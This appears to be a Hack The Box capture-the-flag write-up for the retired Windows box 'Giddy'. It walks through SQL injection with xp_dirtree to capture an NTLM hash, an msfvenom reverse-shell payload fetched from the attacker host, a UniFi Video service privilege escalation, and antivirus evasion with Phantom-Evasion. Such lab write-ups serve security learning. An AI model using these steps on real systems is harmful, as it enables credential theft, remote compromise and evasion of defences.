@@ -1,0 +1,139 @@
+<hr />
+
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Giddy retired and this is my write-up. Giddy was a nice windows box , This box had a nice sqli vulnerability which we will use to steal ntlm hashes and login , Then the privilege escalation was a Local Privilege Escalation vulnerability in a software called Ubiquiti UniFi Video which also was a cool vulnerability , I had fun doing this box as it was a challenging one. It’s a windows box and its ip is 10.10.10.104 , I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">giddy.htb</code>. Let’s jump right in.
+<img src="/images/hackthebox/giddy/0.png" alt="" /></p>
+<hr />
+
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with nmap to scan for open ports and services : 
+<code class="highlighter-rouge">nmap -sV -sT -sC giddy.htb</code>
+<img src="/images/hackthebox/giddy/1.png" alt="" />
+<br /> nmap tells us that port 80 and 443 are open and running http , port 3389 is also open and it says “Microsoft Terminal Services”, Let’s check http
+<br /></p>
+<hr />
+
+<h2 id="http-enumeration">HTTP Enumeration</h2>
+<p><br /> On http (port 80) there’s only this picture :
+<img src="/images/hackthebox/giddy/2.png" alt="" />
+<br /> Also the same picture on https (port 443)
+<img src="/images/hackthebox/giddy/3.png" alt="" />
+<br /> Let’s run gobuster with <code class="highlighter-rouge">directory-list-2.3-medium.txt</code> and see what we will get
+<code class="highlighter-rouge">gobuster -u http://giddy.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -to 250s</code>
+<br /> Results :</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>=====================================================
+Gobuster v2.0.0              OJ Reeves (@TheColonial)                                                                                       
+=====================================================                                                                                       
+[+] Mode         : dir                                                                                                                      
+[+] Url/Domain   : http://giddy.htb/                                                                                                        
+[+] Threads      : 100                                                                                                                      
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                             
+[+] Status codes : 200,204,301,302,307,403                                                                                                  
+[+] Timeout      : 4m10s                                                                                                                    
+=====================================================                                                                                       
+2019/02/15 21:36:09 Starting gobuster                                                                                                       
+=====================================================
+/remote (Status: 302)
+/mvc (Status: 301)
+</code></pre></div></div>
+<p><br /> We got 2 sub directories <code class="highlighter-rouge">/remote</code> and <code class="highlighter-rouge">/mvc</code>
+<br /> Let’s take a look at <code class="highlighter-rouge">/remote</code> :
+<img src="/images/hackthebox/giddy/4.png" alt="" />
+<br /> It redirects us to this page titled as <code class="highlighter-rouge">Windows PowerShell Web Access</code> , we don’t have any credentials so we can ignore this for now and check <code class="highlighter-rouge">/mvc</code>
+<img src="/images/hackthebox/giddy/5.png" alt="" />
+<br /> And we get this <code class="highlighter-rouge">ASP.NET</code> application
+<br /></p>
+<hr />
+
+<h2 id="sqli-and-getting-user">SQLI and getting User</h2>
+<p><br /> After some regular enumeration we will find that when we click on a product name we get something like this :
+<img src="/images/hackthebox/giddy/6.png" alt="" />
+<br /> The url has a parameter called <code class="highlighter-rouge">ProductSubCategoryId</code> , and if we try a single quote <code class="highlighter-rouge">'</code> :
+<img src="/images/hackthebox/giddy/7.png" alt="" />
+<br /> We get an error saying “Unclosed quotation mark after the character string” so this parameter is sql injectable , let’s try something like <code class="highlighter-rouge">1; UPDATE Product SET Name= ''</code>
+<img src="/images/hackthebox/giddy/8.png" alt="" />
+<br /> And we see that it dumped the products, we can run responder and use <code class="highlighter-rouge">xpdirtree</code> to make it try to connect to us , you can read about <code class="highlighter-rouge">xpdirtree</code> <a href="http://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html">here</a>
+<br /> To do this let’s run responder first <code class="highlighter-rouge">responder -I tun0</code>
+<br /> Then let’s use <code class="highlighter-rouge">xpdirtree</code> : <code class="highlighter-rouge">1; EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'</code>
+<img src="/images/hackthebox/giddy/9.png" alt="" />
+<br /> What is this doing is simply running a fake smb server with responder that steals ntlm hashes , then by using <code class="highlighter-rouge">xpdirtree</code> we make the server try to connect to our fake smb server. Let’s check responder now :
+<img src="/images/hackthebox/giddy/10.png" alt="" />
+<br /> We captured ntlm hash for a user called <code class="highlighter-rouge">Stacy</code> , Let’s crack the hash with john
+<img src="/images/hackthebox/giddy/11.png" alt="" />
+<br /> And the password is <code class="highlighter-rouge">xNnWo6272k7x</code> , let’s use the PowerShell Web Access
+<img src="/images/hackthebox/giddy/12.png" alt="" />
+<br /> We ge this web interface for powershell :
+<img src="/images/hackthebox/giddy/13.png" alt="" />
+<br /> We can get the user flag now :
+<img src="/images/hackthebox/giddy/14.png" alt="" />
+<br /> And we owned user !</p>
+<hr />
+
+<h2 id="unifivideo-local-privilege-escalation">unifivideo local privilege escalation</h2>
+<p><br /> If we return to <code class="highlighter-rouge">Documents</code> again we will find a file called <code class="highlighter-rouge">unifivideo</code>
+<img src="/images/hackthebox/giddy/15.png" alt="" />
+<br /></p>
+<blockquote>
+  <p>UniFi Video is a powerful and flexible, integrated IP video management
+surveillance system designed to work with Ubiquiti’s UniFi Video Camera product
+line. UniFi Video has an intuitive, configurable, and feature‑packed user
+interface with advanced features such as motion detection, auto‑discovery,
+user-level security, storage management, reporting, and mobile device support.
+<br /></p>
+</blockquote>
+
+<p><br /> A quick google search and we will find that an old version of unifivideo had a local privilege escalation vulnerability , check it <a href="https://www.exploit-db.com/exploits/43390">here</a>
+<br /> What’s happening is , Upon the start of the service “Ubiquiti UniFi Video” it tries to execute a file called <code class="highlighter-rouge">taskkill.exe</code> in <code class="highlighter-rouge">C:\ProgramData\unifi-video\</code> but that file doesn’t exist by default , if we have write permissions to that directory we can place our payload there as <code class="highlighter-rouge">taskkill.exe</code> then restart the service. And because the service runs with privileged permissions , it will be excuted as administrator.
+<br /> Let’s first create a payload with msfvenom :
+<code class="highlighter-rouge">msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1337 -f exe &gt; taskkill.exe</code>
+<img src="/images/hackthebox/giddy/16.png" alt="" />
+<br /> We will set up the handler on metasploit :
+<code class="highlighter-rouge">use multi/handler</code>
+<br />
+<br />
+<code class="highlighter-rouge">set payload windows/meterpreter_reverse_tcp</code>
+<br />
+<br />
+<code class="highlighter-rouge">set LHOST 10.10.xx.xx</code>
+<br />
+<br />
+<code class="highlighter-rouge">set LPORT 1337</code>
+<br /> Then we will run a simple http server with python to host the payload
+<code class="highlighter-rouge">python -m SimpleHTTPServer 80</code>
+<br /> After that we will download the file , since we are on powershell we can do this :
+<code class="highlighter-rouge">Invoke-WebRequest -o taskkill.exe http://10.10.xx.xx/taskkill.exe</code>
+<br /> Then we will stop the service :
+<code class="highlighter-rouge">Stop-Service "Ubiquiti UniFi Video"</code>
+<img src="/images/hackthebox/giddy/17.png" alt="" />
+<br /> Start it again :
+<code class="highlighter-rouge">Start-Service "Ubiquiti UniFi Video"</code>
+<img src="/images/hackthebox/giddy/18.png" alt="" />
+<br /> Let’s check our listener
+<img src="/images/hackthebox/giddy/19.png" alt="" />
+<br /> We didn’t get a meterpreter session !
+<br /></p>
+<hr />
+
+<h2 id="evading-anti-virus-and-getting-root">Evading anti-virus and getting root</h2>
+<p><br /> We didn’t get a meterpreter session because there’s some kind of anti-virus blocking our payload , so what i’m going to do is to use a framework called <code class="highlighter-rouge">phantom evasion</code> , you can get it from <a href="https://github.com/oddcod3/Phantom-Evasion">github</a>
+<img src="/images/hackthebox/giddy/20.png" alt="" />
+<br /> We will use [1] windows modules , then [1] shellcode injection , [4] windows shellcode injection heapalloc , after that it will ask for the payload :
+<img src="/images/hackthebox/giddy/21.png" alt="" />
+<br /> We will choose Msfvenom 
+<br /> And for encoding we will choose [4] x86/xor_dynamic + Triple Multibyte-key xor:
+<img src="/images/hackthebox/giddy/22.png" alt="" />
+<br /> It will ask for adding multi processes behaviour , stripping and signing the executable , we will say no to all of them , then finally we will have our payload.
+<br /> We will repeat what we did with the other payload again , and let’s check our listener : 
+<img src="/images/hackthebox/giddy/23.png" alt="" />
+<br /> We got a meterpreter session and owned root !
+<br />
+<br />
+<br /> That’s it , Feedback is appreciated !
+<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
+<br /> Thanks for reading.
+<br />
+<br />
+<br /> Previous Hack The Box write-up : <a href="/hack-the-box/ypuffy/">Hack The Box - Ypuffy</a>
+<br /> Next Hack The Box write-up : <a href="/hack-the-box/zipper/">Hack The Box - Zipper</a></p>
+<hr />
+
